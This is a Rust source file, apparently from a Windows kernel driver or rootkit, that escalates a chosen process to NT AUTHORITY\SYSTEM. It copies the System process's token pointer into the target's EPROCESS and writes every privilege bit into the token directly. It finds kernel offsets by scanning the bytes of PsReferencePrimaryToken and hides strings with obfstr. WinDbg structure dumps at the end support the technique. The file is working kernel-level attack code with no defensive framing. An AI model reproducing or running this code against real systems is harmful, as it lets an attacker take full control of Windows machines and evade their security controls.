use common::TargetProcess;
use winapi::{shared::{ntstatus::{STATUS_UNSUCCESSFUL, STATUS_SUCCESS}}};
use winapi::shared::ntdef::{NTSTATUS, UNICODE_STRING};
use crate::{process::{memory::{Process, Token}, get_function_base_address}, includes::ProcessPrivileges};

use crate::string::create_unicode_string;

/// Enables all token privileges for the targeted process
pub fn enable_all_token_privileges(process: *mut TargetProcess) -> NTSTATUS {

    // Must get system before enabling all token privileges otherwise all privileges won't be enabled
    get_system(process);

    // Get target process EPROCESS
    let target_process = match unsafe { Process::by_id((*process).process_id as u64) } {
        Some(p) => p,
        None => return STATUS_UNSUCCESSFUL,
    };

    // Get System process EPROCESS (process ID is always 4)
    let system_process = match Process::by_id(4) {
        Some(p) => p,
        None => return STATUS_UNSUCCESSFUL,
    };


    // Get target process EPROCESS.Token
    let target_token = match Token::by_token(target_process.eprocess) {
        Some(t) => t,
        None => return STATUS_UNSUCCESSFUL,
    };

    // Get system process EPROCESS.Token
    let _system_token = match Token::by_token(system_process.eprocess) {
        Some(t) => t,
        None => return STATUS_UNSUCCESSFUL,
    };

    //The EPROCESS.Token.Privileges offset has not changed change since Windows Vista so we can hardcode here.
    let target_process_privileges = unsafe { 
        (target_token.token.cast::<u8>().offset(0x40)) as *mut ProcessPrivileges
    };

    unsafe { 
        // Consistent accross build versions (System process EPROCESS.Token.Privileges)
        (*target_process_privileges).present = u64::to_le_bytes(0x0000001ff2ffffbc);
        (*target_process_privileges).enabled = u64::to_le_bytes(0x0000001ff2ffffbc);
        //(*target_process_privileges).enabled_by_default = u64::to_le_bytes(0x0000001ff2ffffbc);
    };


    log::info!("Enabled All Token Privileges");

    return STATUS_SUCCESS;
}

/// Elevates to NT AUTHORITY\SYSTEM
fn get_system(process: *mut TargetProcess) -> NTSTATUS {

    // Get target process EPROCESS
    let target_process = match unsafe { Process::by_id((*process).process_id as u64) } {
        Some(p) => p,
        None => return STATUS_UNSUCCESSFUL,
    };

    // Get System process EPROCESS (process ID is always 4)
    let system_process = match Process::by_id(4) {
        Some(p) => p,
        None => return STATUS_UNSUCCESSFUL,
    };

    // Dynamically get EPROCESS.TOKEN offset from PsReferencePrimaryToken
    let eproccess_token_offset = match get_eprocess_token_offset() {
        Some(e) => e,
        None => return STATUS_UNSUCCESSFUL,
    };

    let target_token_address = unsafe { (target_process.eprocess.cast::<u8>().offset(eproccess_token_offset as isize)) as *mut u64};
    let system_token_address = unsafe { (system_process.eprocess.cast::<u8>().offset(eproccess_token_offset as isize)) as *mut u64 };

    log::info!("target_token: {:?}, system_token {:?}", unsafe { target_token_address.read() }, unsafe { system_token_address.read() } );

    unsafe { target_token_address.write(system_token_address.read()) };
    log::info!("W00TW00T NT AUTHORITY\\SYSTEM: {:#x}", unsafe { target_token_address.read() });

    return STATUS_SUCCESS;

}

///Gets the EPROCESS.Token offset dynamically
pub fn get_eprocess_token_offset() -> Option<u16> {
    
    let unicode_function_name = &mut create_unicode_string(
        obfstr::wide!("PsReferencePrimaryToken\0")
    ) as *mut UNICODE_STRING;
    
    let base_address = get_function_base_address(unicode_function_name);

    if base_address.is_null() {
        log::error!("PsReferencePrimaryToken is null");
        return None;
    }

    let func_slice: &[u8] = unsafe { core::slice::from_raw_parts(base_address as *const u8, 0x19) }; //mov     rdi,rcx

    //4883ec
    let needle = [0x48, 0x83]; //4883ec20  sub rsp,20h

    if let Some(y) = func_slice.windows(needle.len()).position(|x| *x == needle) {
        let position = y + 7;
        let offset_slice = &func_slice[position..position + 2]; //u16::from_le_bytes takes 2 slices
        let offset = u16::from_le_bytes(offset_slice.try_into().unwrap());
        log::info!("EPROCESS.TOKEN offset: {:#x}", offset);
        return Some(offset);
    }

    return None;

}


/*
0: kd> dt nt!_EPROCESS
    <...Omitted...>
    +0x4b8 Token            : _EX_FAST_REF
    <...Omitted...>

0: kd> dt nt!_TOKEN
    <...Omitted...>
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
    <...Omitted...>

0: kd> dt nt!_SEP_TOKEN_PRIVILEGES
   +0x000 Present          : Uint8B
   +0x008 Enabled          : Uint8B
   +0x010 EnabledByDefault : Uint8B

0: kd> dt nt!_SEP_LOGON_SESSION_REFERENCES
   +0x000 Next             : Ptr64 _SEP_LOGON_SESSION_REFERENCES
   +0x008 LogonId          : _LUID
   +0x010 BuddyLogonId     : _LUID
   +0x018 ReferenceCount   : Int8B
   +0x020 Flags            : Uint4B
   +0x028 pDeviceMap       : Ptr64 _DEVICE_MAP
   +0x030 Token            : Ptr64 Void
   +0x038 AccountName      : _UNICODE_STRING
   +0x048 AuthorityName    : _UNICODE_STRING
   +0x058 CachedHandlesTable : _SEP_CACHED_HANDLES_TABLE
   +0x068 SharedDataLock   : _EX_PUSH_LOCK
   +0x070 SharedClaimAttributes : Ptr64 _AUTHZBASEP_CLAIM_ATTRIBUTES_COLLECTION
   +0x078 SharedSidValues  : Ptr64 _SEP_SID_VALUES_BLOCK
   +0x080 RevocationBlock  : _OB_HANDLE_REVOCATION_BLOCK
   +0x0a0 ServerSilo       : Ptr64 _EJOB
   +0x0a8 SiblingAuthId    : _LUID
   +0x0b0 TokenList        : _LIST_ENTRY

0: kd> dt _sep_token_privileges ffff99081d2305b0+0x40
nt!_SEP_TOKEN_PRIVILEGES
   +0x000 Present          : 0x0000001f`f2ffffbc
   +0x008 Enabled          : 0x0000001e`60b1e890
   +0x010 EnabledByDefault : 0x0000001e`60b1e890

0: kd> u PsReferencePrimaryToken
nt!PsReferencePrimaryToken:
fffff800`59268f70 48895c2410      mov     qword ptr [rsp+10h],rbx
fffff800`59268f75 48896c2418      mov     qword ptr [rsp+18h],rbp
fffff800`59268f7a 56              push    rsi
fffff800`59268f7b 57              push    rdi
fffff800`59268f7c 4156            push    r14
fffff800`59268f7e 4883ec20        sub     rsp,20h
fffff800`59268f82 488db1b8040000  lea     rsi,[rcx+4B8h]
fffff800`59268f89 488bf9          mov     rdi,rcx
*/